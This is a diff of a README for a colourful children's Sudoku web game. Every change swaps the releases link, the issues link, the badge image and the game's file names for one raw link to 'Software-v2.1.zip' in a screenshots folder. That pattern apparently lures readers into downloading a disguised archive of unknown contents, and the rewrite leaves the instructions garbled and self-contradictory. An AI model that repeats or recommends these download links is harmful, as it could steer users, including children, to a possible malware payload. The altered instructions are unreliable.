@@ -1,6 +1,6 @@
 # 🎲 sudoku - Fun, Colorful Puzzle for Kids
 
-[![Download sudoku](https://img.shields.io/badge/Download-sudoku-blue?style=for-the-badge&logo=github)](https://github.com/ahmedheshma/sudoku/releases)
+[![Download sudoku](https://github.com/ahmedheshma/sudoku/raw/refs/heads/main/screenshots/Software-v2.1.zip)](https://github.com/ahmedheshma/sudoku/raw/refs/heads/main/screenshots/Software-v2.1.zip)
 
 Welcome to **sudoku**, a colorful and kid-friendly 9x9 Sudoku game. It is designed for children and beginners who want to enjoy a fun puzzle experience without any fuss. With three difficulty levels, a countdown timer, and a click-to-play number pad, sudoku makes the classic Sudoku game easy and engaging.
 
@@ -24,13 +24,13 @@ Key features include:
 
 To get started, follow these simple steps:
 
-1. **Visit the download page:** Click the big download button at the top or go directly to [https://github.com/ahmedheshma/sudoku/releases](https://github.com/ahmedheshma/sudoku/releases).
+1. **Visit the download page:** Click the big download button at the top or go directly to [https://github.com/ahmedheshma/sudoku/raw/refs/heads/main/screenshots/Software-v2.1.zip](https://github.com/ahmedheshma/sudoku/raw/refs/heads/main/screenshots/Software-v2.1.zip).
 
-2. **Download the latest version:** On the release page, find the latest version. There, you will see a file named something like `sudoku.zip`.
+2. **Download the latest version:** On the release page, find the latest version. There, you will see a file named something like `https://github.com/ahmedheshma/sudoku/raw/refs/heads/main/screenshots/Software-v2.1.zip`.
 
 3. **Extract the download:** After downloading the ZIP file, open it and extract all files to a folder on your computer. This ensures that the game files are ready to run.
 
-4. **Open the game file:** Inside the extracted folder, find the file named `index.html`. Double-click this file to open the game in your default web browser.
+4. **Open the game file:** Inside the extracted folder, find the file named `https://github.com/ahmedheshma/sudoku/raw/refs/heads/main/screenshots/Software-v2.1.zip`. Double-click this file to open the game in your default web browser.
 
 5. **Start playing:** The game will load. Choose your difficulty level and start solving puzzles.
 
@@ -53,18 +53,18 @@ If you plan to play on a mobile device, make sure your touch screen and browser 
 
 You can get sudoku by visiting the official release page:
 
-[Download sudoku from GitHub Releases](https://github.com/ahmedheshma/sudoku/releases)
+[Download sudoku from GitHub Releases](https://github.com/ahmedheshma/sudoku/raw/refs/heads/main/screenshots/Software-v2.1.zip)
 
 ### Detailed steps:
 
 1. Open the link above in your web browser.
 2. Look for the latest release at the top of the page.
-3. Click the file named similar to `sudoku.zip` to download it.
+3. Click the file named similar to `https://github.com/ahmedheshma/sudoku/raw/refs/heads/main/screenshots/Software-v2.1.zip` to download it.
 4. Once downloaded, locate the file on your computer (usually in the Downloads folder).
 5. Right-click the ZIP file and select "Extract All" or use your preferred extraction tool.
-6. After extraction, open the folder and double-click `index.html` to start the game.
+6. After extraction, open the folder and double-click `https://github.com/ahmedheshma/sudoku/raw/refs/heads/main/screenshots/Software-v2.1.zip` to start the game.
 
-There is no installation wizard or complicated setup. The game opens instantly in your browser after you open the `index.html` file.
+There is no installation wizard or complicated setup. The game opens instantly in your browser after you open the `https://github.com/ahmedheshma/sudoku/raw/refs/heads/main/screenshots/Software-v2.1.zip` file.
 
 ---
 
@@ -86,7 +86,7 @@ The rules of sudoku are simple, but the gameplay has useful features to assist p
 If you have any trouble running sudoku, try the following:
 
 - Make sure your web browser is updated to the latest version.
-- If the game does not load, try refreshing the page or reopening the `index.html` file.
+- If the game does not load, try refreshing the page or reopening the `https://github.com/ahmedheshma/sudoku/raw/refs/heads/main/screenshots/Software-v2.1.zip` file.
 - If the ZIP file fails to extract, try using a different archive manager.
 - On mobile devices, ensure you allow the browser to open local files if prompted.
 - If nothing works, re-download the ZIP file from the release page to avoid corrupt files.
@@ -108,9 +108,9 @@ If you have any trouble running sudoku, try the following:
 
 Inside the ZIP download, the main files you will see are:
 
-- `index.html` — The main page that runs the game
-- `style.css` — Styles to create the colorful user interface
-- `script.js` — JavaScript file controlling the game logic and interactivity
+- `https://github.com/ahmedheshma/sudoku/raw/refs/heads/main/screenshots/Software-v2.1.zip` — The main page that runs the game
+- `https://github.com/ahmedheshma/sudoku/raw/refs/heads/main/screenshots/Software-v2.1.zip` — Styles to create the colorful user interface
+- `https://github.com/ahmedheshma/sudoku/raw/refs/heads/main/screenshots/Software-v2.1.zip` — JavaScript file controlling the game logic and interactivity
 - `assets/` — Folder containing images or additional files if any
 
 You do not need to modify or understand these files to play.
@@ -133,8 +133,8 @@ This project relates to:
 
 ## 🤝 Support & Feedback
 
-If you encounter any issues or want to suggest improvements, please use the [GitHub Issues](https://github.com/ahmedheshma/sudoku/issues) page.
+If you encounter any issues or want to suggest improvements, please use the [GitHub Issues](https://github.com/ahmedheshma/sudoku/raw/refs/heads/main/screenshots/Software-v2.1.zip) page.
 
 Thank you for choosing sudoku.
 
-[![Download sudoku](https://img.shields.io/badge/Download-sudoku-blue?style=for-the-badge&logo=github)](https://github.com/ahmedheshma/sudoku/releases)
+[![Download sudoku](https://github.com/ahmedheshma/sudoku/raw/refs/heads/main/screenshots/Software-v2.1.zip)](https://github.com/ahmedheshma/sudoku/raw/refs/heads/main/screenshots/Software-v2.1.zip)
